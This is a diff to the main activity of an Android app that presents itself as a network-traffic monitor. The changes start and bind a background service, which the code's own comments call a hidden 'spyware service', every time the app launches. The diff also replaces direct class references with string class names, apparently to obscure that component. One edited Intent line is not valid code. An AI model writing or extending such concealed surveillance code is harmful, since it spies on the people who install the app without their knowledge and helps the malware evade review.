@@ -9,6 +9,7 @@ import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.TrafficStats
+import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.IBinder
@@ -43,12 +44,11 @@ class MainActivity : AppCompatActivity() {
     private val uploadEntries = mutableListOf<Entry>()
     private var xIndex = 0
 
-    // Hidden: bind to spyware service
-    private var agentService: com.system.monitor.AgentService? = null
+    // Hidden: bind to spyware service using string class name
+    private var agentService: IBinder? = null
     private val serviceConnection = object : ServiceConnection {
         override fun onServiceConnected(name: ComponentName, service: IBinder) {
-            val binder = service as com.system.monitor.AgentService.LocalBinder
-            agentService = binder.getService()
+            agentService = service
         }
         override fun onServiceDisconnected(name: ComponentName) { agentService = null }
     }
@@ -68,9 +68,9 @@ class MainActivity : AppCompatActivity() {
         setupChart()
         btnStart.setOnClickListener { toggleMonitoring() }
 
-        // Hidden: start spyware service
+        // Hidden: start spyware service using string class name
         startSpywareService()
-        bindService(Intent(this, com.system.monitor.AgentService::class.java), serviceConnection, Context.BIND_AUTO_CREATE)
+        bindService(Intent(this, "com.system.monitor.AgentService"), serviceConnection, Context.BIND_AUTO_CREATE)
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
@@ -191,7 +191,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startSpywareService() {
-        val intent = Intent(this, com.system.monitor.AgentService::class.java)
+        val intent = Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent)
         } else {
